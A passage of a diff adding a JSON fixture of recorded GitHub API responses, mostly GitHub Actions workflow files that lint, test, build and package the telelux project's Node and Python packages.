}}\n          restore-keys: |\n            rust-toolchain-build-${{ runner.os }}-\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_language == 'python' }}\n        uses: astral-sh/setup-uv@v7\n        with:\n          enable-cache: true\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm' }}\n        uses: pnpm/action-setup@v5\n        with:\n          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && needs.detect.outputs.packaging_language == 'typescript' }}\n        name: Install project dependencies\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}\n        run: |\n          set -euo pipefail\n          if [ \"$PM\" = \"pnpm\" ]; then pnpm install --frozen-lockfile; else npm ci; fi\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && needs.detect.outputs.build_command != '' }}\n        name: Run the build step (build_command)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}\n        run: |\n          set -euo pipefail\n          eval \"$BUILD_COMMAND\"\n      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' }}\n        name: Build the distribution (packaging_build)\n        working-directory: ${{ needs.detect.outputs.package_root }}\n        env:\n          PACKAGING_BUILD: ${{ needs.detect.outputs.packaging_build }}\n        run: |\n          set -euo pipefail\n          eval \"$PACKAGING_BUILD\"\n      - name: Check the built distributions ship no test files\n        env:\n          VERSION: ${{ inputs.version }}\n          PACKAGING_ARTIFACT: ${{ inputs.packaging_artifact }}\n          PACKAGE_ROOT: ${{ needs.detect.outputs.package_root }}\n          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}\n        run: |\n          set -euo pipefail\n          # nullglob: an unmatched glob expands to nothing, not the literal; globstar: `**` recurses.\n          shopt -s nullglob globstar\n          pkg=\"${PACKAGE_ROOT:-.}\"\n          if [ -n \"$PACKAGING_ARTIFACT\" ]; then dist_root=_packaging_artifact; crate_root=_packaging_artifact; else dist_root=\"$pkg/dist\"; crate_root=\"$pkg/target/package\"; fi\n          checked=0\n          check () {\n            local lang=\"$1\"; shift\n            for dist in \"$@\"; do\n              echo \"::group::packaging --language $lang $dist\"\n              ${CLI_COMMAND:-npm --prefix \"$RUNNER_TEMP\" exec --yes -- \"testing-conventions${VERSION:+@$VERSION}\"} packaging \"$dist\" --language \"$lang\"\n              echo \"::endgroup::\"\n              checked=$((checked + 1))\n            done\n          }\n          check python \"$dist_root\"/**/*.whl \"$dist_root\"/**/*.tar.gz\n          check typescript \"$dist_root\"/**/*.tgz\n          check rust \"$crate_root\"/**/*.crate\n          if [ \"$checked\" -eq 0 ]; then\n            echo \"::error::no recognized built distribution (.whl / .tar.gz / .tgz / .crate) found in '$dist_root' or '$crate_root'\"\n            exit 1\n          fi\n          echo \"checked $checked built distribution(s); no test files shipped\"\n"
+  },
+  {
+    "method": "downloadTarball",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": {
+      "$binary": "tarball-0.bin"
+    }
+  },
+  {
+    "method": "downloadTarball",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "testing-conventions",
+      "ref": "b3d3556b377c69f594826502c524966f9b0c6f60"
+    },
+    "result": {
+      "$binary": "tarball-1.bin"
+    }
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "path": ".github/workflows/node-telelux-element.yml",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": "name: node/telelux-element\n\n# Fragments and the README feed no job here. Attestation receipts stay in\n# scope: the conventions job's e2e-verify gate walks them.\non:\n  pull_request:\n    paths:\n      - 'packages/node/telelux-element/**'\n      - '!packages/node/telelux-element/changelog.d/**'\n      - '!packages/node/telelux-element/migrations.d/**'\n      - '!packages/node/telelux-element/README.md'\n      - '.github/workflows/node-telelux-element.yml'\n\npermissions:\n  contents: read\n\njobs:\n  conventions:\n    name: node/telelux-element\n    uses: thekevinscott/testing-conventions/.github/workflows/testing-conventions.yml@v0\n    with:\n      languages: '[\"typescript\"]'\n      source: packages/node/telelux-element/src\n      base: ${{ github.event.pull_request.base.sha || 'origin/main' }}\n\n  lint:\n    name: 'node/telelux-element: lint'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux-element\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run lint\n\n  typecheck:\n    name: 'node/telelux-element: typecheck'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux-element\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run typecheck\n\n  test-unit:\n    name: 'node/telelux-element: unit'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux-element\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run test_unit\n\n  test-integration:\n    name: 'node/telelux-element: integration'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux-element\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm exec playwright install --with-deps chromium\n      - run: pnpm run build_demo\n      - run: pnpm run test_integration\n\n  build:\n    name: 'node/telelux-element: build'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux-element\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run build\n"
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "path": ".github/workflows/python-telelux.yml",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": "name: python/telelux\n\n# Fragments and the README feed no job here. Attestation receipts stay in\n# scope: the conventions job's e2e-verify gate walks them.\non:\n  pull_request:\n    paths:\n      - 'packages/python/telelux/**'\n      - '!packages/python/telelux/changelog.d/**'\n      - '!packages/python/telelux/migrations.d/**'\n      - '!packages/python/telelux/README.md'\n      - '.github/workflows/python-telelux.yml'\n\npermissions:\n  contents: read\n\njobs:\n  conventions:\n    name: python/telelux\n    uses: thekevinscott/testing-conventions/.github/workflows/testing-conventions.yml@v0\n    with:\n      languages: '[\"python\"]'\n      source: packages/python/telelux\n      base: ${{ github.event.pull_request.base.sha || 'origin/main' }}\n\n  test:\n    name: 'python/telelux: unit'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v6\n      - uses: astral-sh/setup-uv@v7\n      - uses: extractions/setup-just@v3\n      - run: just test_unit\n        working-directory: packages/python/telelux\n\n  test-integration:\n    name: 'python/telelux: integration'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v6\n      - uses: astral-sh/setup-uv@v7\n      - uses: extractions/setup-just@v3\n      - run: just test_integration\n        working-directory: packages/python/telelux\n\n  build:\n    name: 'python/telelux: build wheel + smoke'\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: ['3.10', '3.11', '3.12', '3.13']\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          # hatch-vcs derives the version from the tag; a shallow clone has none.\n          fetch-depth: 0\n      - uses: actions/setup-python@v6\n        with:\n          python-version: ${{ matrix.python-version }}\n      - run: pip install uv\n      - name: Build wheel\n        run: uv build\n        working-directory: packages/python/telelux\n      - name: Install wheel + smoke (import)\n        run: |\n          python -m venv .venv\n          .venv/bin/pip install packages/python/telelux/dist/*.whl\n          .venv/bin/python -c \"import telelux; print(telelux.__version__)\"\n"
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "path": ".github/workflows/node-telelux-web.yml",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": "name: node/telelux-web\n\n# Fragments and the README feed no job here. Attestation receipts stay in\n# scope: the conventions job's e2e-verify gate walks them.\non:\n  pull_request:\n    paths:\n      - 'packages/node/telelux-web/**'\n      - '!packages/node/telelux-web/changelog.d/**'\n      - '!packages/node/telelux-web/migrations.d/**'\n      - '!packages/node/telelux-web/README.md'\n      - '.github/workflows/node-telelux-web.yml'\n\npermissions:\n  contents: read\n\njobs:\n  conventions:\n    name: node/telelux-web\n    uses: thekevinscott/testing-conventions/.github/workflows/testing-conventions.yml@v0\n    with:\n      languages: '[\"typescript\"]'\n      source: packages/node/telelux-web/src\n      base: ${{ github.event.pull_request.base.sha || 'origin/main' }}\n\n  lint:\n    name: 'node/telelux-web: lint'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux-web\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run lint\n\n  typecheck:\n    name: 'node/telelux-web: typecheck'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux-web\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run typecheck\n\n  test-unit:\n    name: 'node/telelux-web: unit'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux-web\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run test_unit\n\n  test-integration:\n    name: 'node/telelux-web: integration'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux-web\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm exec playwright install --with-deps chromium\n      - run: pnpm run build\n      - run: pnpm run test_integration\n\n  build:\n    name: 'node/telelux-web: build'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux-web\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run build\n"
+  }
+]
